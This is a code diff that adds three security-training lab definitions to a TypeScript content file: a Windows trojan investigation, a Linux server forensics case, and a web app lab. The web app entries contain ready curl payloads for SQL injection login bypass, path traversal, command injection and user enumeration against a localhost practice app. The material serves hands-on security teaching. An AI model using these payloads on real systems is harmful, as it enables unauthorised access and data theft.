@@ -301,4 +301,114 @@ export const labContent: Record<string, LabContent> = {
       },
     ],
   },
+
+  "07-windows-soc": {
+    overview: [
+      "A clipboard-stealing banker trojan was detected on NFC-WS-041 (Finance Workstation — Emily Carter). The malware beacons to 45.33.32.156:443 at regular intervals, exfiltrating clipboard data including copied credentials and crypto wallet addresses.",
+      "Using the PowerShell-based SOC lab environment, you will trace the malicious process from initial execution, identify C2 communications, find all persistence mechanisms (registry Run key + scheduled task), and decode the C2 traffic to capture the flag.",
+      "Run the Docker lab with: cd docker/windows-soc && docker-compose up -d, then connect via: docker exec -it windows-soc pwsh",
+    ],
+    artifacts: [
+      "Malicious process beacon to 45.33.32.156:443 — Get-NetworkConn",
+      "Process dropped to %APPDATA% — Get-ProcessList",
+      "Registry Run key persistence — Get-RegistryRun",
+      "Scheduled task persistence — Get-ScheduledTasks",
+      "Base64-encoded C2 traffic — Decode-Base64",
+      "PowerShell loading clipboard assembly — Get-EventPowerShell",
+    ],
+    queries: [
+      {
+        label: "Start investigation — process list",
+        spl: "Get-ProcessList",
+      },
+      {
+        label: "Network connections to external IPs",
+        spl: "Get-NetworkConn",
+      },
+      {
+        label: "Registry Run key persistence",
+        spl: "Get-RegistryRun",
+      },
+      {
+        label: "Scheduled tasks",
+        spl: "Get-ScheduledTasks",
+      },
+      {
+        label: "Decode C2 payload to get the flag",
+        spl: "Decode-Base64 -S <base64_string_from_network_capture>",
+      },
+    ],
+  },
+
+  "08-linux-forensics": {
+    overview: [
+      "Production web server NFC-SRV-WEB1 (Ubuntu 22.04) was compromised via SSH brute-force from 185.220.101.45. The attacker gained access using the weak password 'Password1!' on the webadmin account, then escalated privileges via a sudo NOPASSWD misconfiguration.",
+      "After privilege escalation, the attacker downloaded a dropper to /tmp/.X11-unix/.cache, established cron persistence, dropped a PHP web shell, exfiltrated /etc/shadow, and added an SSH public key for persistent access.",
+      "Run the Docker lab with: cd docker/linux-forensics && docker-compose up -d, then: docker exec -it linux-forensics bash",
+    ],
+    artifacts: [
+      "/var/log/auth.log — SSH brute-force attempts then successful login",
+      "/home/webadmin/.bash_history — full attacker command sequence",
+      "/var/spool/cron/crontabs/webadmin — cron persistence",
+      "/var/www/html/uploads/img001.php — PHP web shell",
+      "/root/.ssh/authorized_keys — attacker SSH key",
+      "/tmp/.X11-unix/.cache — hidden malware dropper with embedded flag",
+    ],
+    queries: [
+      {
+        label: "Find attacker SSH brute-force and login",
+        spl: "grep 'Failed\\|Accepted' /var/log/auth.log",
+      },
+      {
+        label: "Review attacker bash history",
+        spl: "cat /home/webadmin/.bash_history",
+      },
+      {
+        label: "Find cron persistence",
+        spl: "cat /var/spool/cron/crontabs/webadmin",
+      },
+      {
+        label: "Find PHP web shell",
+        spl: "grep -r 'shell_exec\\|system\\|passthru' /var/www/",
+      },
+      {
+        label: "Extract and decode flag from dropper",
+        spl: "strings /tmp/.X11-unix/.cache | grep 'TkZD' | base64 -d",
+      },
+    ],
+  },
+
+  "09-kali-appsec": {
+    overview: [
+      "The NFC Internal Employee Portal (http://localhost:5000) has been scoped for a full web application security assessment. Three vulnerabilities have been identified: SQL Injection on /login, Path Traversal on /files, and Command Injection on /ping.",
+      "Using Kali Linux tools, exploit each vulnerability to extract the hidden flags. Each successful exploitation earns points and teaches a real-world web attack technique.",
+      "Run the Docker lab with: cd docker/kali-appsec && docker-compose up -d, then: docker exec -it kali-appsec bash",
+    ],
+    artifacts: [
+      "POST /login — SQL Injection to bypass auth and read admin notes (Flag 1)",
+      "GET /files?path= — Path Traversal to read /lab/flags/flag2.txt (Flag 2)",
+      "GET /ping?host= — Command Injection via pipe | to read /lab/flags/flag3.txt (Flag 3)",
+      "GET /user?id= — IDOR to enumerate all user profiles",
+    ],
+    queries: [
+      {
+        label: "Challenge 1 — SQL Injection auth bypass",
+        spl: `curl -s -X POST http://localhost:5000/login \\
+  --data-urlencode "username=' OR '1'='1'-- " \\
+  --data-urlencode "password=x" | python3 -m json.tool`,
+      },
+      {
+        label: "Challenge 2 — Path Traversal",
+        spl: "curl -s 'http://localhost:5000/files?path=../flags/flag2.txt' | python3 -m json.tool",
+      },
+      {
+        label: "Challenge 3 — Command Injection",
+        spl: "curl -s 'http://localhost:5000/ping?host=127.0.0.1|cat /lab/flags/flag3.txt'",
+      },
+      {
+        label: "IDOR — enumerate all users",
+        spl: "for i in 1 2 3 4; do curl -s http://localhost:5000/user?id=$i | python3 -m json.tool; done",
+      },
+    ],
+  },
 };
